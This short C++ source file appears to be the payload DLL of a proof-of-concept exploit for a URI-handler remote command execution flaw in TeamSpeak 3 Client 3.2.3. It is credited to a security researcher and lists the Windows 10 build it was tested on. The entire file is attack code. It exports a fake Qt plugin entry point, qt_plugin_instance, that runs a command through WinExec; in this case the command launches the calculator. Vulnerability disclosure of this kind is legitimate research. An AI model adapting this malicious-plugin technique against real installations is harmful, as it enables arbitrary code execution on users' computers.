// dllmain.cpp : Defines the entry point for the DLL application.
// Purpose     : URI Handler Remote Command Execution Vulnerability in TeamSpeak 3 Client Version 3.2.3
// Author      : Hashim Jawad of ACTIVELabs
// Tested OS   : Microsoft Windows 10 x64 Enterprise (10.0.17134 N/A Build 17134)

#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void qt_plugin_instance()
{
	WinExec("calc", SW_NORMAL);
}